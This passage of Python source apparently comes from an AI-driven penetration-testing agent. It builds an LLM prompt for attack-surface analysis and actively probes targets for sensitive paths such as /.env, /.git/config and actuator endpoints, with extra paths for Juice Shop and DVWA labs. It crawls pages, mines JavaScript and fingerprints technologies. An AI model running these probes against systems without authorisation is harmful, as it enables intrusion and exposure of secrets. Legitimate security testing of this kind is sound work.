            if isinstance(p, dict):
                return f"{p.get('path', p)} [risk: {p.get('risk', 'unknown')}] - {p.get('description', '')}"
            return str(p)

        def _fmt_form(f):
            if isinstance(f, dict):
                inputs = f.get("inputs", [])
                field_names = [
                    (i.get("name", i) if isinstance(i, dict) else i) for i in inputs[:5]
                ]
                return f"[{f.get('method', 'GET')}] {f.get('action', 'unknown')} fields: {field_names}"
            return str(f)

        subdomains_data = _format_list(self.recon.subdomains, max_items=50)
        ports_data = _format_list(self.recon.ports, max_items=30, formatter=_fmt_port)
        technologies_data = (
            ", ".join(self.recon.technologies)
            if self.recon.technologies
            else "None detected"
        )
        endpoints_data = _format_list(
            self.recon.endpoints, max_items=40, formatter=_fmt_endpoint
        )
        api_endpoints_data = _format_list(self.recon.api_endpoints, max_items=20)
        forms_data = _format_list(self.recon.forms, max_items=15, formatter=_fmt_form)

        params_lines = []
        for path, params in list(self.recon.parameters.items())[:20]:
            params_lines.append(f"  - {path}: {params}")
        parameters_data = "\n".join(params_lines) if params_lines else "None discovered"

        js_files_data = _format_list(self.recon.js_files, max_items=20)
        interesting_paths_data = _format_list(
            self.recon.interesting_paths, max_items=20, formatter=_fmt_path
        )
        secrets_data = (
            _format_list(self.recon.secrets, max_items=10)
            if self.recon.secrets
            else "None found"
        )
        dns_records_data = _format_list(self.recon.dns_records, max_items=15)

        # WAF data
        if self.recon.waf_info and self.recon.waf_info.get("detected"):
            waf_entries = []
            for w in self.recon.waf_info.get("wafs", []):
                waf_entries.append(
                    f"{w['name']} (confidence: {w.get('confidence', 0):.0%}, "
                    f"method: {w.get('detection_method', 'unknown')})"
                )
            waf_data_str = "WAF DETECTED:\n" + "\n".join(
                f"  - {w}" for w in waf_entries
            )
            blocking = self.recon.waf_info.get("blocking_patterns")
            if blocking:
                waf_data_str += f"\n  Blocking patterns: {blocking}"
        else:
            waf_data_str = "No WAF detected"

        # --- Build the analysis prompt ---
        user_prompt = f"""You are analyzing the results of an automated reconnaissance scan.

**Target:** {self.target}

**Scan Configuration:**
- Recon Depth: {self.recon.recon_depth}

**Reconnaissance Data:**

### Subdomains ({len(self.recon.subdomains)} discovered)
{subdomains_data}

### Open Ports ({len(self.recon.ports)} discovered)
{ports_data}

### Technologies Detected
{technologies_data}

### Endpoints ({len(self.recon.endpoints)} discovered)
{endpoints_data}

### API Endpoints
{api_endpoints_data}

### Forms ({len(self.recon.forms)} discovered)
{forms_data}

### Parameters
{parameters_data}

### JavaScript Files ({len(self.recon.js_files)} found)
{js_files_data}

### Interesting Paths
{interesting_paths_data}

### Secrets / Credentials
{secrets_data}

### DNS Records
{dns_records_data}

### WAF Detection
{waf_data_str}

**ANALYSIS REQUIREMENTS:**

Produce a structured JSON analysis with the following keys:

{{
    "attack_surface_summary": "2-3 paragraph overview of the attack surface scope and risk posture",
    "technology_analysis": [
        {{"technology": "name", "version_info": "if known", "risk_notes": "CVE exposure and known vuln patterns", "priority_tests": ["specific tests to run"]}}
    ],
    "auth_boundaries": {{
        "auth_endpoints": ["list of discovered auth-related endpoints"],
        "session_mechanism": "observed session management approach",
        "unauthenticated_assets": ["endpoints that appear to lack auth"],
        "admin_interfaces": ["admin/management paths found"]
    }},
    "high_value_targets": [
        {{"endpoint": "url/path", "reason": "why it is high-value", "suggested_tests": ["specific tests"], "priority": "P1/P2/P3"}}
    ],
    "infrastructure_assessment": {{
        "cloud_provider": "identified or unknown",
        "cdn_waf": "CDN/WAF observations",
        "ssl_tls": "TLS posture notes",
        "dns_observations": "notable DNS findings",
        "staging_indicators": ["subdomains or paths suggesting non-production environments"]
    }},
    "exposed_sensitive_data": [
        {{"item": "what was found", "location": "where", "severity": "critical/high/medium/low", "recommendation": "action"}}
    ],
    "strategic_recommendations": [
        {{"priority": "P1/P2/P3/P4", "action": "specific recommendation", "rationale": "why", "endpoints": ["relevant endpoints"]}}
    ]
}}

Respond with ONLY valid JSON. Ground every observation in the provided data."""

        # Get system prompt with recon-appropriate anti-hallucination directives
        from backend.core.vuln_engine.system_prompts import get_system_prompt
        system_prompt = (
            "You are a Senior Reconnaissance Analyst and Attack Surface Specialist. "
            "Analyze the provided reconnaissance data to produce actionable intelligence. "
            "Do NOT hallucinate vulnerabilities - assess attack surface and recommend testing priorities. "
            "Every observation must reference specific data from the scan results.\n\n"
            + get_system_prompt("recon_analysis")
        )

        try:
            analysis = await self.llm.generate_json(user_prompt, system=system_prompt, task_type="recon_analysis")

            if analysis:
                await self.log("info", "[RECON] AI analysis complete")
                return analysis
            else:
                await self.log("warning", "[RECON] AI analysis returned non-JSON")
                return {"raw_analysis": "parse_error", "parse_error": True}

        except Exception as e:
            await self.log("warning", f"[RECON] AI analysis failed: {e}")
            return None

    async def _run_enhanced_recon(self) -> bool:
        """Run enhanced reconnaissance using ReconIntegration tool suite.

        Returns True if enhanced recon succeeded, False to fall back to basic.
        """
        if not HAS_RECON_INTEGRATION:
            await self.log("debug", "[RECON] ReconIntegration not available, using basic recon")
            return False

        try:
            # Check how many tools are installed
            tool_status = await check_tools_installed()
            installed_count = sum(1 for v in tool_status.values() if v)
            if installed_count < 3:
                await self.log("debug", f"[RECON] Only {installed_count} tools installed (<3), using basic recon")
                return False

            await self.log("info", f"[RECON] Enhanced recon: {installed_count} tools available, depth={self.recon_depth}")

            # Create ReconIntegration instance
            ri = ReconIntegration(scan_id=self.scan_id or "recon")

            # Bridge ReconIntegration's log to our agent log callback
            original_log = ri.log

            async def bridged_log(level: str, message: str):
                await self.log(level, message)
                try:
                    await original_log(level, message)
                except Exception:
                    pass

            ri.log = bridged_log

            # Run full recon
            results = await ri.run_full_recon(self.target, depth=self.recon_depth)

            # Map results into self.recon
            self._map_recon_results(results)
            self.recon.recon_depth = self.recon_depth

            await self.log("info", f"[RECON] Enhanced recon complete: "
                           f"{len(self.recon.endpoints)} endpoints, "
                           f"{len(self.recon.subdomains)} subdomains, "
                           f"{len(self.recon.ports)} ports")
            return True

        except Exception as e:
            await self.log("warning", f"[RECON] Enhanced recon failed ({e}), falling back to basic")
            return False

    def _map_recon_results(self, results: Dict):
        """Map ReconIntegration output dict into self.recon fields."""
        # Subdomains
        for sub in results.get("subdomains", []):
            if sub and sub not in self.recon.subdomains:
                self.recon.subdomains.append(sub)

        # Live hosts
        for host in results.get("live_hosts", []):
            if host and host not in self.recon.live_hosts:
                self.recon.live_hosts.append(host)

        # Endpoints (deduplicate by URL)
        existing_urls = {_get_endpoint_url(ep) for ep in self.recon.endpoints}
        for ep in results.get("endpoints", []):
            ep_url = ep.get("url", "") if isinstance(ep, dict) else str(ep)
            if ep_url and ep_url not in existing_urls:
                if isinstance(ep, dict):
                    self.recon.endpoints.append(ep)
                else:
                    self.recon.endpoints.append({"url": ep_url, "source": "recon_integration"})
                existing_urls.add(ep_url)

        # URLs
        for url in results.get("urls", []):
            if url and url not in self.recon.urls:
                self.recon.urls.append(url)

        # Technologies
        for tech in results.get("technologies", []):
            tech_str = tech.get("data", str(tech)) if isinstance(tech, dict) else str(tech)
            if tech_str and tech_str not in self.recon.technologies:
                self.recon.technologies.append(tech_str)

        # Ports
        for port in results.get("ports", []):
            if port and port not in self.recon.ports:
                self.recon.ports.append(port)

        # DNS records
        for rec in results.get("dns_records", []):
            if rec and rec not in self.recon.dns_records:
                self.recon.dns_records.append(rec)

        # Interesting paths
        for path in results.get("interesting_paths", []):
            if path and path not in self.recon.interesting_paths:
                self.recon.interesting_paths.append(path)

        # JS files
        for js in results.get("js_files", []):
            if js and js not in self.recon.js_files:
                self.recon.js_files.append(js)

        # Parameters (URLs with query strings)
        for param_url in results.get("parameters", []):
            if param_url and "?" in param_url:
                parsed = urlparse(param_url)
                params = parse_qs(parsed.query)
                path = parsed.path or "/"
                for param_name in params:
                    if path not in self.recon.parameters:
                        self.recon.parameters[path] = []
                    if param_name not in self.recon.parameters[path]:
                        self.recon.parameters[path].append(param_name)

        # Secrets
        for secret in results.get("secrets", []):
            if secret and secret not in self.recon.secrets:
                self.recon.secrets.append(secret)

    async def _initial_probe(self):
        """Initial probe of the target"""
        try:
            async with self.session.get(self.target, allow_redirects=True) as resp:
                self.recon.live_hosts.append(self.target)
                body = await resp.text()

                # Extract base information
                await self._extract_links(body, self.target)
                await self._extract_forms(body, self.target)
                await self._extract_js_files(body, self.target)

                await self.log("info", f"  Target is live: {resp.status}")
        except Exception as e:
            await self.log("error", f"  Target probe failed: {e}")

    async def _discover_endpoints(self):
        """Discover endpoints through crawling, common paths, and tech-specific paths"""
        # Common paths to check (universal)
        common_paths = [
            "/", "/admin", "/login", "/api", "/api/v1", "/api/v2",
            "/user", "/users", "/account", "/profile", "/dashboard",
            "/search", "/upload", "/download", "/file", "/files",
            "/config", "/settings", "/admin/login", "/wp-admin",
            "/robots.txt", "/sitemap.xml", "/.git/config",
            "/api/users", "/api/login", "/graphql", "/api/graphql",
            "/swagger", "/api-docs", "/docs", "/health", "/status",
            "/.env", "/package.json", "/composer.json", "/web.config",
            "/server-status", "/server-info", "/.well-known/security.txt",
            "/actuator", "/actuator/health", "/metrics", "/debug",
            "/console", "/trace", "/env",
        ]

        base = self.target.rstrip('/')
        parsed_target = urlparse(self.target)

        # --- Tech-specific dynamic paths (Item 6 + 8: data-driven) ---
        techs_lower = [t.lower() for t in self.recon.technologies]
        techs_str = " ".join(techs_lower)

        # Juice Shop / OWASP detection (hostname OR tech detection)
        is_juice_shop = (
            "juice" in parsed_target.netloc.lower() or
            "juice shop" in techs_str or "juiceshop" in techs_str
        )
        if is_juice_shop:
            await self.log("info", "  Detected OWASP Juice Shop — adding comprehensive API paths")
            common_paths.extend([
                # REST API
                "/rest/products/search?q=",
                "/rest/products/reviews",
                "/rest/user/login",
                "/rest/user/change-password",
                "/rest/user/reset-password",
                "/rest/user/security-question",
                "/rest/user/whoami",
                "/rest/user/authentication-details",
                "/rest/basket/0",
                "/rest/saveLoginIp",
                "/rest/deluxe-membership",
                "/rest/continue-code",
                "/rest/continue-code/apply/",
                "/rest/chatbot/status",
                "/rest/chatbot/respond",
                "/rest/memories",
                "/rest/order-history",
                "/rest/wallet/balance",
                "/rest/repeat-notification",
                "/rest/track-order/0",
                # API endpoints
                "/api/Users", "/api/Users/1",
                "/api/Products", "/api/Products/1",
                "/api/Products/1/reviews",
                "/api/Feedbacks", "/api/Feedbacks/1",
                "/api/Complaints", "/api/Complaints/1",
                "/api/Recycles", "/api/Recycles/1",
                "/api/BasketItems", "/api/BasketItems/1",
                "/api/Challenges", "/api/Challenges/?name=",
                "/api/Quantitys", "/api/Quantitys/1",
                "/api/Deliverys", "/api/Deliverys/1",
                "/api/Addresss", "/api/Addresss/1",
                "/api/Cards", "/api/Cards/1",
                "/api/SecurityQuestions",
                "/api/SecurityAnswers",
                # Admin / scoring
                "/api/Challenges",
                "/rest/admin/application-configuration",
                "/rest/admin/application-version",
                # Common Juice Shop challenge paths
                "/ftp", "/ftp/acquisitions.md",
                "/ftp/coupons_2013.md.bak",
                "/ftp/easter.egg",
                "/ftp/encrypt.pyc",
                "/ftp/legal.md",
                "/ftp/package.json.bak",
                "/ftp/quarantine",
                "/ftp/suspicious_errors.yml",
                "/encryptionkeys", "/encryptionkeys/jwt.pub",
                "/snippets", "/snippets/1",
                "/dataerasure",
                "/profile",
                "/privacy-security/privacy-policy",
                "/privacy-security/change-password",
                "/b2b/v2/orders",
                "/promotion",
                "/redirect?to=https://owasp.org",
                "/metrics",
                "/video",
                "/assets/public/images/uploads/",
                "/#/score-board",
                "/#/track-result",
                "/#/administration",
                "/#/recycle",
                "/#/complain",
                "/#/chatbot",
                "/#/deluxe-membership",
                "/#/privacy-security/data-export",
                "/#/wallet",
                "/#/order-history",
                "/#/address/saved",
                "/#/saved-payment-methods",
            ])

        # WordPress
        if any("wordpress" in t for t in techs_lower) or any("wp-" in t for t in techs_lower):
            common_paths.extend([
                "/wp-login.php", "/wp-admin/", "/wp-json/wp/v2/users",
                "/wp-json/wp/v2/posts", "/wp-json/wp/v2/pages",
                "/wp-content/uploads/", "/xmlrpc.php", "/wp-cron.php",
            ])

        # Node.js / Express
        if any("express" in t or "node" in t for t in techs_lower):
            common_paths.extend([
                "/graphql", "/graphiql", "/playground",
                "/.env", "/package.json", "/node_modules/",
                "/socket.io/", "/api/health", "/api/config",
            ])

        # PHP
        if any("php" in t for t in techs_lower):
            common_paths.extend([
                "/phpmyadmin/", "/phpinfo.php", "/info.php",
                "/wp-login.php", "/administrator/",
            ])

        # Java / Spring
        if any("spring" in t or "java" in t or "jsessionid" in t for t in techs_lower):
            common_paths.extend([
                "/actuator", "/actuator/env", "/actuator/health",
                "/actuator/mappings", "/actuator/beans",
                "/swagger-ui.html", "/v2/api-docs", "/v3/api-docs",
                "/h2-console/", "/trace",
            ])

        # Django
        if any("django" in t for t in techs_lower):
            common_paths.extend([
                "/admin/", "/admin/login/", "/__debug__/",
                "/api/", "/static/admin/",
            ])

        # GraphQL (detected)
        if any("graphql" in t for t in techs_lower):
            common_paths.extend([
                "/graphql", "/graphiql", "/altair", "/playground",
                "/graphql/schema.json",
            ])

        # Swagger/OpenAPI
        if any("swagger" in t or "openapi" in t for t in techs_lower):
            common_paths.extend([
                "/swagger-ui/", "/swagger-ui.html", "/swagger.json",
                "/api-docs/", "/v2/api-docs", "/v3/api-docs",
                "/openapi.json", "/openapi.yaml",
            ])

        # Known test sites (hostname-based)
        if "vulnweb" in parsed_target.netloc or "testphp" in parsed_target.netloc:
            await self.log("info", "  Detected test site - adding known vulnerable endpoints")
            common_paths.extend([
                "/listproducts.php?cat=1", "/artists.php?artist=1",
                "/search.php?test=1", "/guestbook.php",
                "/comment.php?aid=1", "/showimage.php?file=1",
            ])
        elif "dvwa" in parsed_target.netloc:
            common_paths.extend([
                "/vulnerabilities/sqli/?id=1&Submit=Submit",
                "/vulnerabilities/xss_r/?name=test",
                "/vulnerabilities/fi/?page=include.php",
            ])

        # Also probe discovered open ports from Naabu (Item 3)
        if self.recon.ports:
            for port_str in self.recon.ports[:10]:
                port = port_str.split("/")[0] if "/" in port_str else port_str
                port_url = f"{parsed_target.scheme}://{parsed_target.hostname}:{port}"
                if port_url != base:
                    common_paths.append(f"__PORT_PROBE__{port_url}")

        # Deduplicate paths
        common_paths = list(dict.fromkeys(common_paths))

        tasks = []
        for path in common_paths:
            if path.startswith("__PORT_PROBE__"):
                # Probe a different port — use full URL
                tasks.append(self._check_endpoint(path.replace("__PORT_PROBE__", "") + "/"))
            else:
                tasks.append(self._check_endpoint(f"{base}{path}"))

        await asyncio.gather(*tasks, return_exceptions=True)

        # Probe for OpenAPI/Swagger specs to discover API endpoints
        await self._parse_api_spec(self.target)

        # Crawl discovered pages for more endpoints (increased depth)
        for endpoint in list(self.recon.endpoints)[:20]:
            await self._crawl_page(_get_endpoint_url(endpoint))

        await self.log("info", f"  Found {len(self.recon.endpoints)} endpoints")

    async def _validate_endpoints(self):
        """Validate discovered endpoints with HTTP probes, removing dead ones."""
        if not self.recon.endpoints:
            return

        sem = asyncio.Semaphore(10)
        validated = []
        removed = 0

        async def _probe(ep):
            nonlocal removed
            url = _get_endpoint_url(ep)
            if not url:
                removed += 1
                return
            try:
                async with sem:
                    timeout = aiohttp.ClientTimeout(total=8)
                    async with self.session.head(url, allow_redirects=True,
                                                 timeout=timeout, ssl=False) as resp:
                        ep["response_status"] = resp.status
                        if resp.status < 500:
                            validated.append(ep)
                        else:
                            removed += 1
            except Exception:
                # Connection error — try GET as fallback (some servers reject HEAD)
                try:
                    async with sem:
                        async with self.session.get(url, allow_redirects=False,
                                                    timeout=aiohttp.ClientTimeout(total=8),
                                                    ssl=False) as resp:
                            ep["response_status"] = resp.status
                            if resp.status < 500:
                                validated.append(ep)
                            else:
                                removed += 1
                except Exception:
                    removed += 1

        await asyncio.gather(*[_probe(ep) for ep in self.recon.endpoints],
                             return_exceptions=True)

        self.recon.endpoints = validated
        await self.log("info", f"  [VALIDATE] Validated {len(validated)} endpoints, removed {removed} dead")

    async def _check_endpoint(self, url: str):
        """Check if endpoint exists"""
        try:
            async with self.session.get(url, allow_redirects=False) as resp:
                if resp.status not in [404, 403, 500, 502, 503]:
                    endpoint_data = {
                        "url": url,
                        "method": "GET",
                        "status": resp.status,
                        "content_type": resp.headers.get("Content-Type", ""),
                        "path": urlparse(url).path
                    }
                    if endpoint_data not in self.recon.endpoints:
                        self.recon.endpoints.append(endpoint_data)
        except Exception:
            pass

    async def _parse_api_spec(self, base_url: str):
        """Probe common OpenAPI/Swagger spec URLs and extract API endpoints."""
        spec_paths = [
            "/api-docs", "/swagger.json", "/openapi.json",
            "/v2/api-docs", "/v3/api-docs",
            "/swagger/v1/swagger.json", "/.well-known/openapi.json",
        ]
        parsed_base = urlparse(base_url)
        origin = f"{parsed_base.scheme}://{parsed_base.netloc}"

        for spec_path in spec_paths:
            spec_url = origin + spec_path
            try:
                async with self.session.get(spec_url, allow_redirects=True,
                                            timeout=aiohttp.ClientTimeout(total=10),
                                            ssl=False) as resp:
                    if resp.status != 200:
                        continue
                    ct = resp.headers.get("Content-Type", "")
                    if "json" not in ct and "yaml" not in ct:
                        continue
                    body = await resp.text()
                    spec = json.loads(body)
            except Exception:
                continue

            # Determine base path prefix
            base_path = ""
            if "basePath" in spec:  # Swagger 2.0
                base_path = spec["basePath"].rstrip("/")

            paths = spec.get("paths", {})
            if not isinstance(paths, dict):
                continue

            added = 0
            for path, methods in paths.items():
                if not isinstance(methods, dict):
                    continue
                for method in methods:
                    if method.lower() not in ("get", "post", "put", "delete", "patch"):
                        continue
                    full_path = base_path + path
                    full_url = origin + full_path
                    ep = {
                        "url": full_url,
                        "method": method.upper(),
                        "path": full_path,
                        "source": "openapi_spec",
                    }
                    if ep not in self.recon.endpoints and len(self.recon.endpoints) < 200:
                        self.recon.endpoints.append(ep)
                        added += 1

            if added:
                await self.log("info", f"  [API SPEC] Discovered {added} endpoints from {spec_url}")
            break  # Stop after first valid spec

    async def _crawl_page(self, url: str):
        """Crawl a page for more links and forms"""
        if not url:
            return
        try:
            async with self.session.get(url) as resp:
                body = await resp.text()
                ct = resp.headers.get("Content-Type", "")
                if "json" in ct:
                    await self._extract_links_from_json(body, url)
                else:
                    await self._extract_links(body, url)
                    await self._extract_forms(body, url)
        except Exception:
            pass

    async def _extract_links(self, body: str, base_url: str):
        """Extract links from HTML"""
        # Find href links
        hrefs = re.findall(r'href=["\']([^"\']+)["\']', body, re.I)
        # Find src links
        srcs = re.findall(r'src=["\']([^"\']+)["\']', body, re.I)
        # Find action links
        actions = re.findall(r'action=["\']([^"\']+)["\']', body, re.I)

        base_parsed = urlparse(base_url)
        base_domain = f"{base_parsed.scheme}://{base_parsed.netloc}"

        for link in hrefs + actions:
            if link.startswith('/'):
                full_url = base_domain + link
            elif link.startswith('http'):
                if urlparse(link).netloc != base_parsed.netloc:
                    continue
                full_url = link
            else:
                continue

            # Skip external links and assets
            if any(ext in link.lower() for ext in ['.css', '.png', '.jpg', '.gif', '.ico', '.svg']):
                continue

            endpoint_data = {
                "url": full_url,
                "method": "GET",
                "path": urlparse(full_url).path
            }
            if endpoint_data not in self.recon.endpoints and len(self.recon.endpoints) < 100:
                self.recon.endpoints.append(endpoint_data)

    async def _extract_links_from_json(self, body: str, base_url: str):
        """Extract links and API paths from JSON response bodies."""
        try:
            data = json.loads(body)
        except (json.JSONDecodeError, TypeError):
            return

        parsed_base = urlparse(base_url)
        origin = f"{parsed_base.scheme}://{parsed_base.netloc}"

        def _walk(obj):
            if isinstance(obj, str):
                val = obj.strip()
                if val.startswith("http://") or val.startswith("https://"):
                    if urlparse(val).netloc == parsed_base.netloc:
                        yield val
                elif val.startswith("/") and len(val) > 1 and not val.startswith("//"):
                    yield origin + val
            elif isinstance(obj, dict):
                for v in obj.values():
                    yield from _walk(v)
            elif isinstance(obj, list):
                for item in obj:
                    yield from _walk(item)

        for url in _walk(data):
            parsed = urlparse(url)
            # Skip assets
            if any(parsed.path.lower().endswith(ext) for ext in (".css", ".png", ".jpg", ".gif", ".ico", ".svg", ".woff", ".woff2")):
                continue
            ep = {
                "url": url.split("?")[0],  # strip query for dedup
                "method": "GET",
                "path": parsed.path,
                "source": "json_body",
            }
            if ep not in self.recon.endpoints and len(self.recon.endpoints) < 200:
                self.recon.endpoints.append(ep)

    async def _extract_forms(self, body: str, base_url: str):
        """Extract forms from HTML including input types and hidden field values"""
        # Capture the opening <form> tag attributes AND inner content separately
        form_pattern = r'<form([^>]*)>(.*?)</form>'
        forms = re.findall(form_pattern, body, re.I | re.DOTALL)

        base_parsed = urlparse(base_url)

        for form_attrs, form_html in forms:
            # Extract action from the <form> tag attributes
            action_match = re.search(r'action=["\']([^"\']*)["\']', form_attrs, re.I)
            action = action_match.group(1) if action_match else base_url

            if action.startswith('/'):
                action = f"{base_parsed.scheme}://{base_parsed.netloc}{action}"
            elif not action.startswith('http'):
                action = base_url

            # Extract method from the <form> tag attributes
            method_match = re.search(r'method=["\']([^"\']*)["\']', form_attrs, re.I)
            method = (method_match.group(1) if method_match else "GET").upper()

            # Extract inputs with type and value details
            inputs = []
            input_details = []
            input_elements = re.findall(r'<input[^>]*>', form_html, re.I)
            for inp_el in input_elements:
                name_m = re.search(r'name=["\']([^"\']+)["\']', inp_el, re.I)
                if not name_m:
                    continue
                name = name_m.group(1)
                type_m = re.search(r'type=["\']([^"\']+)["\']', inp_el, re.I)
                val_m = re.search(r'value=["\']([^"\']*)["\']', inp_el, re.I)
                inp_type = type_m.group(1).lower() if type_m else "text"
                inp_value = val_m.group(1) if val_m else ""
                inputs.append(name)
                input_details.append({
                    "name": name, "type": inp_type, "value": inp_value
                })

            # Textareas (always user-editable text)
            textareas = re.findall(r'<textarea[^>]*name=["\']([^"\']+)["\']', form_html, re.I)
            for ta in textareas:
                inputs.append(ta)
                input_details.append({"name": ta, "type": "textarea", "value": ""})

            form_data = {
                "action": action,
                "method": method,
                "inputs": inputs,
                "input_details": input_details,
                "page_url": base_url,
            }
            self.recon.forms.append(form_data)

    async def _extract_js_files(self, body: str, base_url: str):
        """Extract JavaScript files"""
        js_files = re.findall(r'src=["\']([^"\']*\.js)["\']', body, re.I)
        base_parsed = urlparse(base_url)

        for js in js_files[:10]:
            if js.startswith('/'):
                full_url = f"{base_parsed.scheme}://{base_parsed.netloc}{js}"
            elif js.startswith('http'):
                full_url = js
            else:
                continue

            if full_url not in self.recon.js_files:
                self.recon.js_files.append(full_url)
                # Try to extract API endpoints from JS
                await self._extract_api_from_js(full_url)

    async def _extract_api_from_js(self, js_url: str):
        """Extract API endpoints from JavaScript files"""
        try:
            async with self.session.get(js_url, ssl=False) as resp:
                content = await resp.text()

                # Find API patterns (expanded)
                api_patterns = [
                    r'["\']/(api/[^"\'?\s]+)["\']',
                    r'["\']/(rest/[^"\'?\s]+)["\']',
                    r'["\']/(v[0-9]+/[^"\'?\s]+)["\']',
                    r'fetch\s*\(\s*["\']([^"\']+)["\']',
                    r'axios\.[a-z]+\s*\(\s*["\']([^"\']+)["\']',
                    r'\.(?:get|post|put|delete|patch)\s*\(\s*["\']([^"\']+)["\']',
                    r'url\s*[:=]\s*["\']([^"\']*(?:api|rest|v\d)[^"\']*)["\']',
                    r'endpoint\s*[:=]\s*["\']([^"\']+)["\']',
                    r'(?:path|route)\s*[:=]\s*["\'](/[^"\']+)["\']',
                    r'(?:XMLHttpRequest|\.open)\s*\(\s*["\'](?:GET|POST|PUT|DELETE)["\']\s*,\s*["\']([^"\']+)["\']',
                ]

                base = urlparse(self.target)
                for pattern in api_patterns:
                    matches = re.findall(pattern, content)
                    for match in matches[:15]:
                        if match.startswith('/'):
                            full_url = f"{base.scheme}://{base.netloc}{match}"
                        elif match.startswith('http'):
                            full_url = match
                        elif match.startswith('api/') or match.startswith('rest/') or match.startswith('v'):
                            full_url = f"{base.scheme}://{base.netloc}/{match}"
                        else:
                            continue
                        if full_url not in self.recon.api_endpoints and len(self.recon.api_endpoints) < 200:
                            self.recon.api_endpoints.append(full_url)
        except Exception:
            pass

    async def _deep_js_analysis(self):
        """Deep analysis of JS bundles: re-fetch known JS files + discover inline scripts + sourcemaps"""
        base = urlparse(self.target)
        base_url = f"{base.scheme}://{base.netloc}"

        # Re-process all JS files with expanded extraction
        for js_url in list(self.recon.js_files):
            await self._extract_api_from_js(js_url)

        # Try to find webpack/vite chunk manifests
        manifest_paths = [
            "/asset-manifest.json", "/manifest.json",
            "/_next/static/chunks/webpack.js",
            "/static/js/main.chunk.js",
        ]
        for path in manifest_paths:
            try:
                async with self.session.get(f"{base_url}{path}", ssl=False) as resp:
                    if resp.status == 200:
                        content = await resp.text()
                        # Extract more JS file paths from manifests
                        js_refs = re.findall(r'["\'](/[^"\']*\.js)["\']', content)
                        for ref in js_refs[:20]:
                            full = f"{base_url}{ref}"
                            if full not in self.recon.js_files:
                                self.recon.js_files.append(full)
                                await self._extract_api_from_js(full)
            except Exception:
                pass

        # Add all discovered API endpoints as recon endpoints
        for api_url in self.recon.api_endpoints:
            endpoint_data = {
                "url": api_url,
                "method": "GET",
                "path": urlparse(api_url).path,
                "source": "js_analysis",
            }
            if endpoint_data not in self.recon.endpoints and len(self.recon.endpoints) < 200:
                self.recon.endpoints.append(endpoint_data)

        await self.log("info", f"  JS analysis: {len(self.recon.js_files)} JS files, {len(self.recon.api_endpoints)} API routes extracted")

    async def _discover_parameters(self):
        """Discover parameters in endpoints"""
        for endpoint in self.recon.endpoints[:20]:
            url = _get_endpoint_url(endpoint)
            parsed = urlparse(url)

            # Extract query parameters
            if parsed.query:
                params = parse_qs(parsed.query)
                self.recon.parameters[url] = list(params.keys())

        # Also get parameters from forms
        for form in self.recon.forms:
            self.recon.parameters[form['action']] = form.get('inputs', [])

        total_params = sum(len(v) for v in self.recon.parameters.values())
        await self.log("info", f"  Found {total_params} parameters in {len(self.recon.parameters)} endpoints")

    async def _detect_technologies(self):
        """Detect technologies via headers, body signatures, cookies, and error pages"""
        try:
            async with self.session.get(self.target, ssl=False) as resp:
                headers = dict(resp.headers)
                body = await resp.text()
                cookies = {c.key: c.value for c in self.session.cookie_jar}

                # Server header
                if "Server" in headers:
                    self.recon.technologies.append(f"Server: {headers['Server']}")

                # X-Powered-By
                if "X-Powered-By" in headers:
                    self.recon.technologies.append(headers["X-Powered-By"])

                # Technology signatures (expanded)
                signatures = {
                    "WordPress": ["wp-content", "wp-includes", "wordpress", "wp-json"],
                    "Laravel": ["laravel", "XSRF-TOKEN", "laravel_session"],
                    "Django": ["csrfmiddlewaretoken", "__admin__", "django"],
                    "Express.js": ["express", "X-Powered-By: Express"],
                    "ASP.NET": ["__VIEWSTATE", "asp.net", ".aspx", "__RequestVerificationToken"],
                    "PHP": [".php", "PHPSESSID"],
                    "React": ["react", "_reactRoot", "__REACT", "react-root", "data-reactroot"],
                    "Angular": ["ng-app", "ng-version", "angular", "ng-controller"],
                    "Vue.js": ["vue", "__VUE", "v-cloak", "data-v-"],
                    "jQuery": ["jquery", "$.ajax", "jQuery"],
                    "Bootstrap": ["bootstrap", "btn-primary"],
                    "Node.js": ["node", "x-powered-by: express"],
                    "Spring": ["jsessionid", "spring", "X-Application-Context"],
                    "Ruby on Rails": ["_session_id", "rails", "action_dispatch"],
                    "Flask": ["flask", "werkzeug"],
                    "Nginx": ["nginx"],
                    "Apache": ["apache"],
                    "Cloudflare": ["cloudflare", "cf-ray", "__cfduid"],
                    "Juice Shop": ["juice-shop", "juice shop", "juiceshop", "OWASP Juice Shop"],
                    "Swagger/OpenAPI": ["swagger", "openapi", "api-docs"],
                    "GraphQL": ["graphql", "graphiql", "__schema"],
                    "Next.js": ["__next", "_next/", "next-router"],
                    "Nuxt.js": ["__nuxt", "_nuxt/"],
                }

                body_lower = body.lower()
                headers_str = str(headers).lower()
                cookies_str = str(cookies).lower()

                for tech, patterns in signatures.items():
                    if any(p.lower() in body_lower or p.lower() in headers_str or p.lower() in cookies_str for p in patterns):
                        if tech not in self.recon.technologies:
                            self.recon.technologies.append(tech)

                # Cookie-based detection
                cookie_techs = {
                    "connect.sid": "Express.js", "JSESSIONID": "Java/Spring",
                    "PHPSESSID": "PHP", "ASP.NET_SessionId": "ASP.NET",
                    "_csrf": "Node.js/Express", "laravel_session": "Laravel",
                    "rack.session": "Ruby", "language": "Juice Shop",
                }
                for cookie_name, tech in cookie_techs.items():
                    if cookie_name.lower() in cookies_str:
                        if tech not in self.recon.technologies:
                            self.recon.technologies.append(tech)

                # Error page fingerprinting — probe a 404 path
                try:
                    async with self.session.get(
                        self.target.rstrip('/') + '/neurosploit_404_probe_' + str(hash(self.target))[-6:],
                        ssl=False
                    ) as err_resp:
                        err_body = await err_resp.text()
                        err_lower = err_body.lower()
                        error_sigs = {
                            "Express.js": ["cannot get /", "express"],
                            "Django": ["django", "you're seeing this error because"],
                            "Laravel": ["laravel", "whoops!"],
                            "Spring": ["whitelabel error page", "spring boot"],
                            "ASP.NET": ["runtime error", "asp.net"],
                            "Nginx": ["nginx"],
                            "Apache": ["apache", "not found"],
                            "Juice Shop": ["owasp juice shop", "juice-shop"],
                        }
                        for tech, patterns in error_sigs.items():
                            if any(p in err_lower for p in patterns):
                                if tech not in self.recon.technologies:
                                    self.recon.technologies.append(tech)
                except Exception:
                    pass

        except Exception as e:
            await self.log("debug", f"Tech detection error: {e}")

        await self.log("info", f"  Detected: {', '.join(self.recon.technologies[:10]) or 'Unknown'}")

    # ==================== VULNERABILITY TESTING ====================

    async def _run_full_auto(self) -> Dict:
        """Full automated assessment"""
        await self._update_progress(0, "Starting full assessment")

        # Pre-flight: target health check
        if self.session:
            healthy, health_info = await self.response_verifier.check_target_health(
                self.session, self.target
            )
            if healthy:
                await self.log("info", f"[HEALTH] Target is alive (status={health_info.get('status')}, "
